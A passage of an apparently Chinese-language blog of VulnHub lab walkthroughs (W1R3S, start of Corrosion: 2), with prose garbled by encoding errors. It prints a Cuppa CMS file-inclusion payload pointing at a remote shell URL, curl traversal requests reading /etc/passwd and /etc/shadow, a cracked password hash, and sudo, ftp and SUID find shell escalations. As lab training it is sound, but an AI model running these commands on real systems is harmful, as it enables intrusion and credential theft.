class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.145/wordpress</span><br>Scan Aborted: The URL supplied redirects to http://localhost/wordpress/. Use the --ignore-main-redirect option to ignore the redirection and scan the target, or change the --url option value to the redirected URL.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://localhost/wordpress/</span><br>Scan Aborted: The url supplied &#x27;http://localhost/wordpress/&#x27; seems to be down (Couldn&#x27;t connect to server)<br></code></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸ªé‡å®šå‘ï¼Œé‡å®šå‘åˆ°äº†æœ¬åœ°ï¼Œä¿®æ”¹ hosts æ–‡ä»¶åä»æ— æ³•è¿›è¡Œæ‰«æ ã€‚</p><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>æŸ¥æ‰¾ Cuppa æ¼æ´è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit Cuppa</span><br>--------------------------------------------------------------------------------- --------------------------<br> Exploit Title                                                                   |  Path<br>--------------------------------------------------------------------------------- --------------------------<br>Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion                  | php/webapps/25971.txt<br>--------------------------------------------------------------------------------- --------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹è¯¥æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸¤ä¸ª payloadï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">#####################################################<br>EXPLOIT<br>#####################################################<br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></code></pre></td></tr></table></figure><p>å‘ç°è¯¥ CMS å­˜åœ¨ä¸€ä¸ªæœ¬åœ°/è¿œç¨‹æ–‡ä»¶åŒ…å«çš„æ¼æ´ã€‚</p><p>ç»è¿‡å°è¯•ï¼Œå‘ç°å…³é—­äº†è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œåªèƒ½è¿›è¡Œæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œæ‰€ä»¥ï¼Œå°è¯•å¾—åˆ°ç”¨æˆ·åå¯†ç åè¿›è¡Œè§£å¯†ã€‚</p><h3 id="M1ã€burp"><a href="#M1ã€burp" class="headerlink" title="M1ã€burp"></a>M1ã€burp</h3><p>ç›´æ¥æµè§ˆå™¨è®¿é—®ï¼Œè¯»å– <code>/etc/passwd</code> æ–‡ä»¶ï¼š</p><p><a href="http://192.168.135.145/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.135.145/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>æ˜¾ç¤ºä¸å­˜åœ¨ï¼Œè€ƒè™‘åˆ°æ‰«åˆ°çš„ç›®å½•ä¸º administrator ï¼Œæ‰€ä»¥å¯¹ payload è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹ï¼š</p><p><a href="http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>å†æ¬¡è®¿é—®ï¼Œè™½æˆåŠŸè®¿é—®ï¼Œä½†æ²¡æœ‰å†…å®¹æ˜¾ç¤ºã€‚</p><p>ç”¨ burp æŠ“åŒ…ï¼Œå°† GET æ–¹å¼æ”¹æˆ POST æ–¹å¼ï¼Œè¿›è¡Œå°è¯•ï¼ŒæˆåŠŸå¾—åˆ° <strong><code>username:w1r3s</code></strong></p><p>åŒæ ·çš„æ–¹æ³•è¯»å– <code>/etc/shadow</code> ï¼š</p><p><a href="http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow">http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow</a></p><p>å¾—åˆ°ç”¨æˆ· <code>w1r3s</code> çš„ <code>salt å¯†ç </code> ï¼Œç”¨ <code>john</code> ç ´è§£æ­¤å¯†ç ï¼Œå¾—åˆ°<strong><code>password:computer</code></strong></p><p>ssh ç™»å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh w1r3s@192.168.135.145</span><br><br>w1r3s@W1R3S:~$ whoami<br>\w1r3s<br>w1r3s@W1R3S:~$ id<br>uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br></code></pre></td></tr></table></figure><h3 id="M2ã€Curl"><a href="#M2ã€Curl" class="headerlink" title="M2ã€Curl"></a>M2ã€Curl</h3><blockquote><p>Curlè¯¦è§£ï¼š<a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl çš„ç”¨æ³•æŒ‡å— - é˜®ä¸€å³° (ruanyifeng.com)</a></p></blockquote><p>ä½¿ç”¨ curl æ¥åˆ©ç”¨ LFI æ¼æ´è·å– <code>/etc/password</code> æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -s --data-urlencode <span class="hljs-string">&#x27;urlConfig=../../../../../../../../../etc/passwd&#x27;</span> http://192.168.135.145/administrator/alerts/alertConfigField.php</span><br>w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†ä¸€ä¸ªç”¨æˆ· <code>w1r3s</code> ï¼Œç„¶ååŒæ ·çš„æ–¹æ³•è¯»å– <code>/etc/shadow</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -s --data-urlencode <span class="hljs-string">&#x27;urlConfig=../../../../../../../../../etc/shadow&#x27;</span> http://192.168.135.145/administrator/alerts/alertConfigField.php</span><br>w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†ç”¨æˆ· <code>w1r3s</code> çš„ <code>salt å¯†ç </code> ï¼Œå°†å¯†ç å¤åˆ¶åˆ° <code>1.txt</code> æ–‡ä»¶ä¸­ï¼Œç”¨ <code>john</code> ç ´è§£æ­¤å¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span><br>w1r3s:computer:17567:0:99999:7:::1 password hash cracked, 0 left<br></code></pre></td></tr></table></figure><p><strong>shadow æ–‡ä»¶è§£æï¼š</strong></p><p>æ–‡ä»¶çš„æ ¼å¼ä¸ºï¼š{ç”¨æˆ·å}ï¼š{åŠ å¯†åçš„å£ä»¤å¯†ç }ï¼š{å£ä»¤æœ€åä¿®æ”¹æ—¶é—´è·åŸç‚¹(1970-1-1)çš„å¤©æ•°}ï¼š{å£ä»¤æœ€å°ä¿®æ”¹é—´éš”(é˜²æ­¢ä¿®æ”¹å£ä»¤ï¼Œå¦‚æœæ—¶é™æœªåˆ°ï¼Œå°†æ¢å¤è‡³æ—§å£ä»¤)ï¼š{å£ä»¤æœ€å¤§ä¿®æ”¹é—´éš”}ï¼š{å£ä»¤å¤±æ•ˆå‰çš„è­¦å‘Šå¤©æ•°}ï¼š{è´¦æˆ·ä¸æ´»åŠ¨å¤©æ•°}ï¼š{è´¦å·å¤±æ•ˆå¤©æ•°}ï¼š{ä¿ç•™}</p><blockquote><p>å…¶ä¸­{åŠ å¯†åçš„å£ä»¤å¯†ç }çš„æ ¼å¼ä¸ºï¼š$id$salt$encrypted</p><ul><li>idä¸º1æ—¶ï¼Œé‡‡ç”¨md5ç®—æ³•åŠ å¯†</li><li>idä¸º5æ—¶ï¼Œé‡‡ç”¨SHA256ç®—æ³•åŠ å¯†</li><li>idä¸º6æ—¶ï¼Œé‡‡ç”¨SHA512ç®—æ³•åŠ å¯†</li><li>saltä¸ºç›å€¼ï¼Œæ˜¯å¯¹å¯†ç è¿›è¡Œhashçš„ä¸€ä¸ªå¹²æ‰°å€¼</li><li>encryptedä¸ºæ•£åˆ—å€¼</li></ul></blockquote><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><h3 id="M1ï¼šç›´æ¥ææƒ"><a href="#M1ï¼šç›´æ¥ææƒ" class="headerlink" title="M1ï¼šç›´æ¥ææƒ"></a>M1ï¼šç›´æ¥ææƒ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">w1r3s@W1R3S:~$ sudo -l<br>[sudo] password for w1r3s: <br>Matching Defaults entries for w1r3s on W1R3S:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User w1r3s may run the following commands on W1R3S:<br>    (ALL : ALL) ALL<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> ç›´æ¥é‡ç½® root å¯†ç æˆ–è€…ç›´æ¥ sudo å°±èƒ½æ‹¿åˆ° root</span><br><span class="hljs-meta">#</span><span class="bash"> ç”±äº ubtun ç³»ç»Ÿé»˜è®¤æ˜¯æ²¡æœ‰æ¿€æ´» root ç”¨æˆ·çš„ï¼Œéœ€è¦ç®¡ç†å‘˜æ‰‹å·¥è¿›è¡Œæ“ä½œ sudo passwd æˆ–è€… sudo passwd root</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æˆ–è€… sudo -i ç›´æ¥æ— å¯†ç è¿›å…¥ root</span><br>w1r3s@W1R3S:~$ sudo -i<br>root@W1R3S:~# logout<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æˆ–è€… sudo su ç›´æ¥æ— å¯†ç è¿›å…¥ root</span><br>w1r3s@W1R3S:~$ sudo su<br>root@W1R3S:/home/w1r3s# exit<br><br></code></pre></td></tr></table></figure><h3 id="M2ï¼šftpææƒ"><a href="#M2ï¼šftpææƒ" class="headerlink" title="M2ï¼šftpææƒ"></a>M2ï¼šftpææƒ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">w1r3s@W1R3S:~$ sudo ftp<br><span class="hljs-meta">ftp&gt;</span><span class="bash"> !/bin/bash</span><br>root@W1R3S:~# whoami<br>root<br>root@W1R3S:~# id<br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><h3 id="M3ï¼šå†…æ ¸ææƒ"><a href="#M3ï¼šå†…æ ¸ææƒ" class="headerlink" title="M3ï¼šå†…æ ¸ææƒ"></a>M3ï¼šå†…æ ¸ææƒ</h3><p>ç•¥</p><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>1ã€ftpï¼šä¿¡æ¯æ³„éœ²</p><p>2ã€web cmsï¼šshellã€å†…æ ¸æ¼æ´ã€ææƒï¼ˆæˆç†Ÿï¼‰</p><p>3ã€Linux johnï¼šå¯†ç ç ´è§£ã€åœ¨çº¿ã€kaliè¿˜æœ‰</p><p>4ã€ææƒï¼š</p><p><strong>mysql:UDF</strong></p><p><strong>core</strong></p><p><strong>sudo</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo -l</span><br>[sudo] password for kali: <br>Matching Defaults entries for kali on kali:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User kali may run the following commands on kali:<br>    (ALL : ALL) ALL<br>    # (root) NOPASSWD: /usr/bin/python3<br>    # (root) NOPASSWD: /usr/bin/python3 /home/kali/a.out<br></code></pre></td></tr></table></figure><p><strong>SUID</strong></p><p><strong>SUIDå¯ä»¥è®©è°ƒç”¨è€…ä»¥æ–‡ä»¶æ‹¥æœ‰è€…çš„èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨SUIDææƒçš„æ€è·¯å°±æ˜¯è¿è¡Œrootç”¨æˆ·æ‰€æ‹¥æœ‰çš„SUIDçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿è¡Œè¯¥æ–‡ä»¶çš„æ—¶å€™å°±å¾—è·å¾—rootç”¨æˆ·çš„èº«ä»½äº†ã€‚</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> æŸ¥æ‰¾å…·æœ‰rootæƒé™çš„SUIDçš„æ–‡ä»¶</span><br><span class="hljs-meta">#</span><span class="bash"> å¯ä»¥çœ‹åˆ°findå‘½ä»¤å…·æœ‰SUIDæƒé™ï¼Œå¦‚æœfindä»¥SUIDæƒé™è¿è¡Œï¼Œæ‰€æœ‰é€šè¿‡findæ‰§è¡Œçš„å‘½ä»¤éƒ½ä¼šä»¥rootæƒé™è¿è¡Œã€‚</span><br><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span><br>......<br>/usr/bin/find<br><span class="hljs-meta">#</span><span class="bash"> /home/kali/b.out</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls -al /usr/bin/find</span><br>ls -al /usr/bin/find<br>-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æŸ¥æ‰¾æ ¹ç›®å½•ä¸‹åä¸º thefinalflag.txt çš„æ–‡ä»¶å¹¶æ‰§è¡Œ shell</span><br><span class="hljs-meta">#</span><span class="bash"> -<span class="hljs-built_in">exec</span> å‚æ•°åé¢è·Ÿçš„æ˜¯<span class="hljs-built_in">command</span>å‘½ä»¤ï¼Œå®ƒçš„ç»ˆæ­¢æ˜¯ä»¥;ä¸ºç»“æŸæ ‡å¿—çš„ï¼Œæ‰€ä»¥è¿™å¥å‘½ä»¤åé¢çš„åˆ†å·æ˜¯ä¸å¯ç¼ºå°‘çš„ï¼Œè€ƒè™‘åˆ°å„ä¸ªç³»ç»Ÿä¸­åˆ†å·ä¼šæœ‰ä¸åŒçš„æ„ä¹‰ï¼Œæ‰€ä»¥åœ¨åˆ†å·å‰é¢åŠ åæ–œæ ã€‚</span><br><span class="hljs-meta">$</span><span class="bash"> find / -name thefinalflag.txt -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;</span><br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)<br></code></pre></td></tr></table></figure><p><strong>rootç¨‹åºï¼ˆagentï¼‰</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -user root -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span><br>......<br>/home/kali/b.out<br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ /usr/local/bin/agent;<br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : <br>www-data@imf:/var/www/html/imfadministrator/uploads $ ls -al /usr/local/bin/agent<br>-rwxr-xr-x 1 root root 11896 Oct 12  2016 /usr/local/bin/agent<br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ ps -aux | grep agent<br>root      1332  0.0  0.0   2188   480 ?        Ss   20:35   0:00 agent<br>www-data  1397  0.0  0.0   4500   852 ?        S    20:41   0:00 sh -c ps -aux | grep agent 2&gt;&amp;1<br>www-data  1399  0.0  0.1  11280  1028 ?        S    20:41   0:00 grep agent<br>www-data@imf:/var/www/html/imfadministrator/uploads $ ps -aux | grep agent<br>www-data  1423  0.0  0.0   2188   544 ?        S    20:44   0:00 /usr/local/bin/agent<br>www-data  1434  0.0  0.0   4500   848 ?        S    20:44   0:00 sh -c ps -aux | grep agent 2&gt;&amp;1<br>www-data  1436  0.0  0.0  11280   924 ?        S    20:44   0:00 grep agent<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Corrosionï¼š2</title>
    <link href="/2022/06/30/Penetration/Vulnhub/Part-1/0x0E%20Corrosion-2/"/>
    <url>/2022/06/30/Penetration/Vulnhub/Part-1/0x0E%20Corrosion-2/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0E-Corrosion-2-vulnhub"><a href="#0x0E-Corrosion-2-vulnhub" class="headerlink" title="0x0E Corrosion: 2~vulnhub"></a>0x0E Corrosion: 2~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/corrosion-2,745/">Corrosion: 2 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.150</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.150</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.150</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-30 04:13 EDT<br>Nmap scan report for 192.168.135.150<br>Host is up (0.00038s latency).<br>Not shown: 65532 closed ports<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)<br>|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)<br>|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>8080/tcp open  http    Apache Tomcat 9.0.53<br>|_http-favicon: Apache Tomcat<br>|_http-title: Apache Tomcat/9.0.53<br>MAC Address: 00:0C:29:B4:39:BC (VMware)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.6<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.38 ms 192.168.135.150<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 12.88 seconds <br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.41 ((Ubuntu))</td></tr><tr><td>8080/tcp</td><td>open</td><td>http</td><td>Apache Tomcat 9.0.53</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>22ç«¯å£</strong></p><p>æš‚æ—¶æœªå¾—åˆ° username å’Œ password çš„ç›¸å…³ä¿¡æ¯ï¼Œæ— æ³•ä½¿ç”¨ ssh</p><p><strong>80ç«¯å£</strong></p><p>è¿›è¡Œç›®å½•æ‰«ææ— æœ ã€‚</p><p><strong>8080ç«¯å£</strong></p><p>è¿›è¡Œç›®å½•æ‰«æï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirsearch -u http://192.168.135.150:8080</span><br><br>Target: http://192.168.135.150:8080/<br><br>[05:01:04] Starting:                            <br>[05:01:31] 200 -   33KB - /backup.zip                                       <br>[05:01:39] 200 -   15KB - /docs/                                                                           <br>[05:01:40] 200 -    1KB - /examples/                                        <br>[05:01:40] 200 -    6KB - /examples/servlets/index.html  <br>[05:01:41] 200 -   21KB - /favicon.ico                                      <br>[05:01:42] 200 -  686B  - /examples/jsp/snp/snoop.jsp<br>[05:01:45] 200 -   11KB - /index.jsp                               <br>[05:01:45] 401 -    2KB - /manager/html<br>[05:02:00] 200 -  153B  - /readme.txt  <br><br>Task Completed     <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.150:8080/ -X .php,.jsp,.zip,.txt</span><br><br>URL_BASE: http://192.168.135.150:8080/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>EXTENSIONS_LIST: (.php,.jsp,.zip,.txt) | (.php)(.jsp)(.zip)(.txt) [NUM = 4]<br><br>---- Scanning URL: http://192.168.135.150:8080/ ----<br>+ http://192.168.135.150:8080/backup.zip (CODE:200|SIZE:33723)<br>+ http://192.168.135.150:8080/index.jsp (CODE:200|SIZE:11136)<br>+ http://192.168.135.150:8080/readme.txt (CODE:200|SIZE:153)   <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nikto -h 192.168.135.150:8080</span>                           <br>- Nikto v2.1.6<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.135.150<br>+ Target Hostname:    192.168.135.150<br>+ Target Port:        8080<br>+ Start Time:         2022-07-01 03:47:20 (GMT-4)<br>---------------------------------------------------------------------------<br>+ OSVDB-39272: <br>+ /backup.zip: Potentially interesting archive/cert file found.<br>+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).<br>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS <br>+ OSVDB-397: HTTP method (&#x27;Allow&#x27; Header): &#x27;PUT&#x27; method could allow clients to save files on the web server.<br>+ OSVDB-5646: HTTP method (&#x27;Allow&#x27; Header): &#x27;DELETE&#x27; may allow clients to remove files on the web server.<br>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.<br>+ OSVDB-3092: /readme.txt: This might be interesting...<br>+ /manager/html: Default Tomcat Manager / Host Manager interface found<br>+ /host-manager/html: Default Tomcat Manager / Host Manager interface found<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸¤ä¸ªé‡è¦æ–‡ä»¶ï¼š<code>/backup.zip</code> å’Œ <code>/readme.txt</code></p><p>è®¿é—® <code>http://192.168.135.150:8080/readme.txt</code> ï¼Œå¾—åˆ°æç¤ºï¼š</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span 